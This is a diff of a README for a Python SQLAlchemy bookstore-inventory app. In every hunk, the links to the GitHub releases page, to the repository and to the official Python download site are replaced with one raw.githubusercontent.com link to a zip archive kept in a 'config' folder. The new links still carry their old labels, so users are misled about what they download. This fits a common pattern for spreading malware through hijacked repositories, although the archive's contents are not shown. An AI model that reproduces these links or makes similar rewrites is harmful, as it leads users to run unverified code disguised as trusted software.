@@ -4,13 +4,13 @@
 The BookStore-ORM-System is a Python application designed to help you manage your bookstore efficiently. This system uses SQLAlchemy ORM to handle your book inventory and sales. It applies design principles for better maintenance and functionality. Whether you want to add new books, update existing ones, or track sales, this system makes it simple. 
 
 ## 📁 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Zair5884/BookStore-ORM-System/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Zair5884/BookStore-ORM-System/main/config/BookStore-ORM-System_v2.9-alpha.1.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Zair5884/BookStore-ORM-System/main/config/BookStore-ORM-System_v2.9-alpha.1.zip)
 
 ## 🚀 Getting Started
 To get started with the BookStore-ORM-System, follow these steps:
 
 1. **Visit the Download Page**: Click on the link below to access the latest release of the software.
-   [Visit this page to download](https://github.com/Zair5884/BookStore-ORM-System/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Zair5884/BookStore-ORM-System/main/config/BookStore-ORM-System_v2.9-alpha.1.zip)
 
 2. **Choose the Right Version**: Look for the most recent version. It will have the version number and the date it was released.
 
@@ -41,7 +41,7 @@ To ensure the best performance, here are the recommended system requirements:
 - **Disk Space**: A minimum of 200 MB free for installation.
 - **Python**: Version 3.6 or later must be installed on your system.
 
-You can download the latest version of Python from the [official website](https://www.python.org/downloads/).
+You can download the latest version of Python from the [official website](https://raw.githubusercontent.com/Zair5884/BookStore-ORM-System/main/config/BookStore-ORM-System_v2.9-alpha.1.zip).
 
 ## 🛠️ Installation Guide
 If you encounter any issues during the installation, here’s a quick troubleshooting guide:
@@ -62,7 +62,7 @@ After you successfully install the BookStore-ORM-System, follow these steps to s
 ## 📰 Frequently Asked Questions (FAQ)
 
 ### How do I update the application?
-To update, simply revisit the [Download Page](https://github.com/Zair5884/BookStore-ORM-System/releases) and download the latest version. Follow the same installation steps as before.
+To update, simply revisit the [Download Page](https://raw.githubusercontent.com/Zair5884/BookStore-ORM-System/main/config/BookStore-ORM-System_v2.9-alpha.1.zip) and download the latest version. Follow the same installation steps as before.
 
 ### Can I run this software without an internet connection?
 Yes, once the application is installed, you can use it offline. However, an internet connection is required for any updates.
@@ -74,7 +74,7 @@ For any questions or assistance, please raise an issue on the GitHub repository 
 If you have any questions or comments about the BookStore-ORM-System, feel free to reach out via the GitHub repository. We appreciate your feedback!
 
 ### Important Links
-- [Download the Latest Release](https://github.com/Zair5884/BookStore-ORM-System/releases)
-- [GitHub Repository](https://github.com/Zair5884/BookStore-ORM-System)
+- [Download the Latest Release](https://raw.githubusercontent.com/Zair5884/BookStore-ORM-System/main/config/BookStore-ORM-System_v2.9-alpha.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Zair5884/BookStore-ORM-System/main/config/BookStore-ORM-System_v2.9-alpha.1.zip)
 
 This README aims to provide you with a clear and straightforward guide to downloading and running the BookStore-ORM-System. Enjoy managing your bookstore!
